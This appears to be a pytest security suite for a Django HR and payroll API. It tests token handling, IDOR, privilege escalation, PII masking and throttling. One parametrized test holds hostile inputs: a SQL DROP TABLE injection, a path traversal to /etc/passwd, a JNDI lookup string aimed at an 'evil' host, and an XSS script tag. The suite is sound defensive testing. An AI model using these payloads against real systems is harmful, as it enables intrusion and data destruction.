"""
Cutover gate 4: security.

Authentication, token handling, IDOR, privilege escalation, scope bypass, PII
exposure, credential exposure, injection, and unauthenticated access.

Each test attacks the API the way an attacker would — over HTTP, with a token,
ignoring whatever the UI does or does not render. Several of these would pass
trivially against a system that simply hid the button.
"""

from __future__ import annotations

import pytest
from rest_framework import status
from rest_framework.request import Request
from rest_framework.test import APIRequestFactory

pytestmark = pytest.mark.django_db

PASSWORD = "test-password-12345"


# ===========================================================================
# Authentication
# ===========================================================================


def test_every_api_route_refuses_an_anonymous_caller(anon):
    """No endpoint is reachable without authenticating."""
    from tests.cutover.test_ceo_write_walker import ROUTES

    reachable = []
    for route in ROUTES:
        # Deliberate public routes: the health check, and the organisation's
        # public face — the login screen and the public job-application page
        # must be able to say WHOSE system this is before anyone signs in,
        # and the branding endpoint exposes nothing beyond what those pages
        # show (display name, legal name, logo). The schema/docs routes are
        # mounted only under DEBUG — their absence in production is asserted
        # separately below, which is the assertion that actually protects
        # anything.
        if route in ("/api/v1/health/", "/api/v1/org/branding/") or route.startswith(
            "/api/schema"
        ):
            continue
        response = anon.get(route)
        if response.status_code not in (401, 403, 404, 405):
            reachable.append(f"GET {route} -> {response.status_code}")

    assert not reachable, "Reachable without a token:\n  " + "\n  ".join(reachable)


def test_the_api_schema_is_not_published_in_production():
    """
    `/api/schema/` describes every endpoint, field and enum in the system.

    It is genuinely useful in development and is exactly the reconnaissance a
    stranger would want, so it is mounted behind `if settings.DEBUG`. Production
    sets DEBUG=False, which removes the route entirely rather than protecting
    it — asserted by reading the URLconf rather than trusting the comment.
    """
    import inspect

    from config import urls as urlconf

    source = inspect.getsource(urlconf)

    # The ROUTE registration, not the import at the top of the file.
    route_index = source.find('path("api/schema/"')
    debug_index = source.find("if settings.DEBUG")

    assert route_index != -1, "Schema route not found — this test needs updating."
    assert debug_index != -1 and debug_index < route_index, (
        "The OpenAPI schema routes must be mounted inside `if settings.DEBUG`, "
        "or production publishes a complete map of the API to anonymous callers."
    )

    # And the schema endpoint itself must not be self-serving when it is served.
    from django.conf import settings

    assert settings.SPECTACULAR_SETTINGS.get("SERVE_INCLUDE_SCHEMA") is False


def test_the_health_check_is_the_only_deliberate_exception(anon):
    """One unauthenticated route, and it says nothing about the business."""
    response = anon.get("/api/v1/health/")

    assert response.status_code == 200
    body = str(response.json()).lower()
    for leak in ("employee", "salary", "candidate", "version", "secret"):
        assert leak not in body, f"Health check leaks '{leak}'."


def test_a_garbage_token_is_rejected(api):
    api.credentials(HTTP_AUTHORIZATION="Bearer not-a-real-token")
    assert api.get("/api/v1/employees/").status_code == 401


def test_an_expired_token_is_rejected(api, everyone):
    """A token past its lifetime must not work, whatever it claims."""
    from datetime import timedelta

    from rest_framework_simplejwt.tokens import AccessToken

    token = AccessToken.for_user(everyone["hr_head"])
    token.set_exp(lifetime=timedelta(seconds=-60))

    api.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
    assert api.get("/api/v1/employees/").status_code == 401


def test_a_tampered_token_signature_is_rejected(api, everyone):
    """Flipping the payload without the signing key must invalidate it."""
    from rest_framework_simplejwt.tokens import AccessToken

    token = str(AccessToken.for_user(everyone["employee"]))
    head, payload, signature = token.split(".")
    tampered = f"{head}.{payload}.{signature[:-4]}AAAA"

    api.credentials(HTTP_AUTHORIZATION=f"Bearer {tampered}")
    assert api.get("/api/v1/employees/").status_code == 401


def test_a_deactivated_users_token_stops_working(api, everyone):
    """
    Deactivation must take effect immediately, not at token expiry.

    Otherwise a dismissed employee keeps full access for the remainder of their
    15-minute window — which is exactly when it matters most.
    """
    from rest_framework_simplejwt.tokens import AccessToken

    user = everyone["hr_head"]
    token = str(AccessToken.for_user(user))

    user.is_active = False
    user.save(update_fields=["is_active"])

    api.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
    assert api.get("/api/v1/employees/").status_code in (401, 403)


def test_the_refresh_token_never_appears_in_a_response_body(api, everyone):
    """It belongs in an httpOnly cookie; a body copy is reachable from JS."""
    response = api.post(
        "/api/v1/auth/login/",
        {"email": everyone["hr_head"].email, "password": PASSWORD},
        format="json",
    )

    assert response.status_code == 200
    assert "refresh" not in response.json()


def test_the_refresh_cookie_is_httponly_and_samesite_strict(api, everyone):
    response = api.post(
        "/api/v1/auth/login/",
        {"email": everyone["hr_head"].email, "password": PASSWORD},
        format="json",
    )
    from django.conf import settings

    cookie = response.cookies.get(settings.REFRESH_COOKIE_NAME)

    assert cookie is not None
    assert cookie["httponly"], "Refresh cookie must be httpOnly."
    assert str(cookie["samesite"]).lower() == "strict"


def test_a_replayed_refresh_token_is_rejected(api, everyone):
    """
    Rotation plus reuse detection.

    A refresh token used twice means it leaked; the second use must fail rather
    than quietly mint another session.
    """
    login = api.post(
        "/api/v1/auth/login/",
        {"email": everyone["hr_head"].email, "password": PASSWORD},
        format="json",
    )
    from django.conf import settings

    name = settings.REFRESH_COOKIE_NAME
    original = login.cookies[name].value

    first = api.post("/api/v1/auth/refresh/")
    assert first.status_code == 200

    api.cookies[name] = original
    replay = api.post("/api/v1/auth/refresh/")

    assert replay.status_code == 401


def test_wrong_and_unknown_emails_fail_identically(api, everyone):
    """
    No user-enumeration oracle.

    Different messages, or a materially different response, would let someone
    discover which addresses exist.
    """
    unknown = api.post(
        "/api/v1/auth/login/",
        {"email": "nobody@nowhere.test", "password": "whatever-12345"},
        format="json",
    )
    wrong = api.post(
        "/api/v1/auth/login/",
        {"email": everyone["hr_head"].email, "password": "wrong-password-12345"},
        format="json",
    )

    def message(response):
        # The envelope carries a unique request id, which legitimately differs.
        # What must be identical is everything that describes the FAILURE.
        error = response.json().get("error", {})
        return error.get("code"), error.get("message")

    assert unknown.status_code == wrong.status_code
    assert message(unknown) == message(wrong)


# ===========================================================================
# IDOR and scope bypass
# ===========================================================================


def test_an_employee_cannot_read_another_employees_record_by_id(auth, everyone, staff):
    """
    The classic IDOR, and it must 404 rather than 403.

    A 403 confirms the row exists, which turns id-guessing into an org chart.
    """
    target = staff["hr_head"].pk
    response = auth(everyone["therapist"]).get(f"/api/v1/employees/{target}/")

    assert response.status_code == status.HTTP_404_NOT_FOUND


def test_an_employee_cannot_read_another_employees_payslip(auth, everyone, staff):
    from apps.payroll.models import Payslip

    other = staff["hr_head"]
    payslip = Payslip.objects.filter(employee=other).first()
    if payslip is None:
        pytest.skip("No payslip fixture in this run.")

    response = auth(everyone["therapist"]).get(f"/api/v1/payslips/{payslip.pk}/")
    assert response.status_code == status.HTTP_404_NOT_FOUND


def test_a_filter_parameter_cannot_widen_scope(auth, everyone, staff):
    """
    Filtering happens INSIDE the scoped queryset, never instead of it.

    Asking for someone else's id by filter must return nothing, not their row.
    """
    other = staff["hr_head"].pk
    response = auth(everyone["therapist"]).get(f"/api/v1/employees/?id={other}")

    assert response.status_code == 200
    rows = response.json().get("data", [])
    assert all(row["id"] != str(other) for row in rows)


def test_a_department_head_cannot_reach_another_department_by_id(auth, everyone, staff):
    target = staff["cre"].pk  # Operations
    response = auth(everyone["medical_director"]).get(f"/api/v1/employees/{target}/")

    assert response.status_code == status.HTTP_404_NOT_FOUND


def test_a_manager_cannot_reach_a_peer_teams_member(auth, everyone, staff):
    """TEAM scope is the reporting tree, not the whole department."""
    target = staff["cre"].pk  # reports into Operations, not Medical
    response = auth(everyone["senior_doctor"]).get(f"/api/v1/employees/{target}/")

    assert response.status_code == status.HTTP_404_NOT_FOUND


# ===========================================================================
# Privilege escalation
# ===========================================================================


def test_an_employee_cannot_grant_themselves_a_role(auth, everyone, roles):
    """The most direct escalation there is."""
    response = auth(everyone["therapist"]).post(
        "/api/v1/users/",
        {"email": "new@x.test", "role_code": "admin"},
        format="json",
    )
    assert response.status_code in (403, 404, 405)


def test_an_employee_cannot_change_their_own_employment_status(auth, everyone, staff):
    """
    Self-service EDIT at SELF must not reach status.

    Otherwise anyone could mark themselves CONFIRMED and skip probation, or
    RESIGNED and trigger an exit.
    """
    me = staff["therapist"].pk
    response = auth(everyone["therapist"]).patch(
        f"/api/v1/employees/{me}/", {"status": "confirmed"}, format="json"
    )

    if response.status_code == 200:
        staff["therapist"].refresh_from_db()
        assert staff["therapist"].status != "confirmed", (
            "An employee changed their own employment status."
        )


def test_an_employee_cannot_raise_their_own_salary(auth, everyone, staff):
    response = auth(everyone["therapist"]).post(
        "/api/v1/payroll/structures/",
        {
            "employee": str(staff["therapist"].pk),
            "ctc_annual": "9900000.00",
            "valid_from": "2026-01-01",
            "lines": [],
        },
        format="json",
    )
    assert response.status_code in (400, 403, 404)


def test_a_department_head_cannot_perform_the_final_rejection(auth, everyone):
    """
    The two-level design, attacked directly over HTTP.

    Department heads recommend; only HR Head rejects. Hiding the button is not
    the control — this is.
    """
    from apps.recruitment.models import Application

    application = Application.objects.first()
    if application is None:
        pytest.skip("No application fixture in this run.")

    response = auth(everyone["medical_director"]).post(
        f"/api/v1/applications/{application.pk}/reject/",
        {"reason": "Attempting a rejection I am not entitled to perform."},
        format="json",
    )
    assert response.status_code in (403, 404)


def test_payroll_staff_cannot_approve_a_payroll_run(auth, everyone):
    from apps.payroll.models import PayrollRun

    run = PayrollRun.objects.first()
    if run is None:
        pytest.skip("No payroll run fixture in this run.")

    response = auth(everyone["payroll_executive"]).post(
        f"/api/v1/payroll/runs/{run.pk}/approve/", {}, format="json"
    )
    assert response.status_code in (403, 404)


# ===========================================================================
# PII and credentials
# ===========================================================================


def test_no_endpoint_ever_returns_a_credential(auth, everyone):
    """
    The absolute rule: no API response contains a password, anywhere.

    Walked across every readable route rather than asserted on the one endpoint
    someone remembered.
    """
    from tests.cutover.test_ceo_write_walker import ROUTES

    # Password-hash prefixes, and the raw fixture password. A field NAMED
    # "password" is not itself a leak — the audit log legitimately records THAT
    # a password changed, with the value redacted to "***" by the registry.
    # What must never appear is a value: a hash, or a plaintext secret.
    forbidden_values = ("pbkdf2_", "argon2", "bcrypt$", "$2b$", PASSWORD)
    leaks = []

    for code in ("admin", "hr_head", "finance_head", "therapist"):
        client = auth(everyone[code])
        for route in ROUTES:
            response = client.get(route)
            if response.status_code != 200:
                continue
            body = response.content.decode("utf-8", "replace")
            for needle in forbidden_values:
                if needle in body:
                    leaks.append(f"{code} GET {route} leaks a credential value ({needle!r})")

    assert not leaks, "Credential VALUES in responses:\n  " + "\n  ".join(leaks)


def test_the_audit_log_records_that_a_password_changed_without_its_value(auth, everyone):
    """
    The distinction the previous test rests on.

    "password" appearing as a field name in the audit trail is correct and
    wanted — you must be able to see that a credential was changed. The
    registry redacts the value at write time, so what appears is `***`.
    """
    from apps.audit.models import AuditLog

    user = everyone["employee"]
    user.set_password("a-new-password-98765")
    user.save()

    entries = AuditLog.objects.filter(entity_type="accounts.User").order_by("-id")[:10]
    recorded = [e for e in entries if "password" in (e.after or {})]

    assert recorded, "A password change was not audited at all."
    for entry in recorded:
        assert entry.after["password"] == "***"
        assert "pbkdf2" not in str(entry.after)
        assert "a-new-password-98765" not in str(entry.after)


def test_sensitive_identifiers_are_masked_in_the_profile(auth, everyone, staff):
    """
    PAN, Aadhaar and bank account are encrypted at rest and masked on the way
    out. There is no unmasked variant of this endpoint by design.
    """
    employee = staff["therapist"]
    employee.pan = "ABCDE1234F"
    employee.aadhaar = "123412341234"
    employee.bank_account_number = "1234567890123"
    employee.save()

    response = auth(everyone["hr_head"]).get(f"/api/v1/employees/{employee.pk}/")
    body = response.content.decode()

    assert "ABCDE1234F" not in body
    assert "123412341234" not in body
    assert "1234567890123" not in body


def test_an_employee_cannot_read_a_colleagues_sensitive_fields(auth, everyone, staff):
    other = staff["office_boy"]
    other.pan = "ZZZZZ9999Z"
    other.save()

    response = auth(everyone["therapist"]).get(f"/api/v1/employees/{other.pk}/")

    assert response.status_code == 404
    assert "ZZZZZ9999Z" not in response.content.decode()


def test_audit_records_that_a_pan_changed_but_never_its_value(staff):
    """Redaction at write time: you learn a field moved, never what it held."""
    from apps.audit.models import AuditLog

    employee = staff["therapist"]
    employee.pan = "QQQQQ1111Q"
    employee.save()

    entries = AuditLog.objects.filter(entity_type="employees.Employee").order_by("-id")[:5]
    for entry in entries:
        assert "QQQQQ1111Q" not in str(entry.after or {})
        assert "QQQQQ1111Q" not in str(entry.before or {})


# ===========================================================================
# Injection and input handling
# ===========================================================================


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE employees_employee; --",
        "1 OR 1=1",
        "%27%20OR%201=1",
        "../../etc/passwd",
        "${jndi:ldap://evil/x}",
        "<script>alert(1)</script>",
    ],
)
def test_hostile_search_input_is_handled_safely(auth, everyone, payload):
    """
    The ORM parameterises everything, so this is a regression guard rather than
    a discovery: it fails loudly if anyone ever introduces raw SQL.
    """
    from apps.employees.models import Employee

    response = auth(everyone["hr_head"]).get("/api/v1/employees/", {"search": payload})

    assert response.status_code in (200, 400)
    assert Employee.objects.exists(), "Employee table went missing — injection succeeded."


def test_a_script_tag_is_stored_and_returned_as_data_not_markup(auth, everyone, staff):
    """
    The API is JSON-only, so XSS is the SPA's boundary — React escapes by
    default. What matters here is that the payload round-trips as TEXT and is
    never reflected into an HTML response.
    """
    employee = staff["therapist"]
    employee.first_name = "<script>alert('x')</script>"
    employee.save()

    response = auth(everyone["hr_head"]).get(f"/api/v1/employees/{employee.pk}/")

    assert response["Content-Type"].startswith("application/json")
    assert response.json()["first_name"] == "<script>alert('x')</script>"


def test_an_oversized_body_is_refused_rather_than_absorbed(auth, everyone):
    response = auth(everyone["hr_head"]).post(
        "/api/v1/candidates/", {"first_name": "A" * 100_000}, format="json"
    )
    assert response.status_code in (400, 413)


# ===========================================================================
# Headers and transport
# ===========================================================================


def test_production_settings_demand_https_and_secure_cookies():
    """
    Asserted by reading the file, NOT by importing it.

    `prod.py` does `from .base import *` and then mutates `STORAGES["default"]`
    in place. Because that is the same dict object base.py built, importing the
    module under any other settings silently switches file storage to S3 for the
    rest of the process — which is exactly what happened when this test did
    import it, and every later test that wrote a document or rendered a PDF
    failed trying to reach a bucket.

    Reading the source proves the guarantee that matters — the file cannot be
    deployed in a weak state — with no side effects.
    """
    from pathlib import Path

    source = (
        Path(__file__).resolve().parents[2] / "config" / "settings" / "prod.py"
    ).read_text(encoding="utf-8")

    required = [
        "DEBUG = False",
        "SECURE_SSL_REDIRECT = True",
        "SESSION_COOKIE_SECURE = True",
        "CSRF_COOKIE_SECURE = True",
        "REFRESH_COOKIE_SECURE = True",
        "SECURE_CONTENT_TYPE_NOSNIFF = True",
        'X_FRAME_OPTIONS = "DENY"',
        "SECURE_HSTS_INCLUDE_SUBDOMAINS = True",
        "SECURE_HSTS_PRELOAD = True",
    ]
    missing = [line for line in required if line not in source]
    assert not missing, f"Production settings are missing: {missing}"

    # A full year, and stated as a number rather than trusted from a comment.
    import re

    hsts = re.search(r"SECURE_HSTS_SECONDS\s*=\s*([0-9_]+)", source)
    assert hsts and int(hsts.group(1).replace("_", "")) >= 31_536_000

    # Rate limits must key on the real client, not on the proxy.
    #
    # Production runs behind Caddy -> nginx, so REMOTE_ADDR is nginx for every
    # visitor alike. With NUM_PROXIES unset, DRF fell back to it and the whole
    # organisation shared ONE login budget: ten sign-ins by anybody locked
    # everyone out for an hour, and an attacker got the same allowance as all
    # legitimate users combined.
    assert re.search(r'"NUM_PROXIES":\s*2', source), (
        "Production must set NUM_PROXIES so throttles identify the real client "
        "instead of the nginx container."
    )

    # And it must refuse to boot rather than fall back to something weak.
    assert "raise RuntimeError" in source, (
        "Production settings must fail closed on a misconfiguration."
    )


def test_login_throttle_counts_each_client_separately_behind_the_proxies(settings):
    """
    The setting above is only worth having if it produces the right identity, so
    this exercises the actual resolution rather than trusting the number.

    Three cases, all with the SAME REMOTE_ADDR, because in production every
    request arrives from the nginx container:

      * two different clients must not share a budget
      * a client forging its own X-Forwarded-For must not be able to claim
        another address, or the throttle becomes trivially evadable by the one
        party it exists to stop

    The forged case is what makes counting from the RIGHT the correct rule: a
    header the client controls is prepended, and skipping a fixed number of
    trusted hops from the end steps straight past it.
    """
    from rest_framework.throttling import SimpleRateThrottle
    from rest_framework.views import APIView

    factory = APIRequestFactory()

    # Set through the real setting, because get_ident reads
    # `api_settings.NUM_PROXIES` — an attribute on the throttle instance is
    # ignored, which is exactly how a first version of this test passed a
    # broken configuration. This is also what proves prod.py puts the key in
    # the right place: inside the REST_FRAMEWORK dict.
    settings.REST_FRAMEWORK = {**settings.REST_FRAMEWORK, "NUM_PROXIES": 2}

    class _Throttle(SimpleRateThrottle):
        scope = "login"

    throttle = _Throttle()

    def ident(xff):
        request = factory.post("/api/v1/auth/login/")
        request.META["REMOTE_ADDR"] = "172.27.0.7"  # nginx, always
        request.META["HTTP_X_FORWARDED_FOR"] = xff
        return throttle.get_ident(Request(request, parsers=APIView().get_parsers()))

    alice = ident("203.0.113.10, 172.27.0.5")
    bob = ident("198.51.100.20, 172.27.0.5")

    assert alice == "203.0.113.10"
    assert bob == "198.51.100.20"
    assert alice != bob, (
        "Two clients resolved to one identity — they would share a single login "
        "budget and lock each other out."
    )
    assert "172.27.0" not in alice, (
        "Resolved to a proxy address; every user would be throttled as one."
    )

    # Attacker sends X-Forwarded-For: 1.2.3.4 to impersonate someone else.
    # Caddy appends the true peer, nginx appends Caddy — the forged entry is
    # pushed left, past the two trusted hops.
    forged = ident("1.2.3.4, 203.0.113.99, 172.27.0.5")
    assert forged == "203.0.113.99", (
        "A client-supplied X-Forwarded-For was trusted; an attacker could pick a "
        "fresh identity per request and never be rate-limited."
    )


def test_the_bootstrap_route_does_not_exist_without_its_token(settings):
    """
    A genuine 404, not a 403.

    Checked by RESOLVING the path rather than requesting it. The endpoint is
    throttled to 5/hour on purpose, and that budget is shared across the test
    session — the dedicated bootstrap suite needs all of it, and a probe here
    would starve it. Resolution proves the same thing: with no token the route
    is not registered, so there is nothing to probe or brute-force.
    """
    import importlib

    from django.urls import NoReverseMatch, clear_url_caches, reverse

    settings.ADMIN_BOOTSTRAP_TOKEN = ""

    import apps.accounts.api.urls as auth_urls
    import config.urls as root_urls

    importlib.reload(auth_urls)
    importlib.reload(root_urls)
    clear_url_caches()

    try:
        with pytest.raises(NoReverseMatch):
            reverse("v1:bootstrap-admin")
    finally:
        # Restore, so the next suite sees the URLconf it expects.
        importlib.reload(auth_urls)
        importlib.reload(root_urls)
        clear_url_caches()
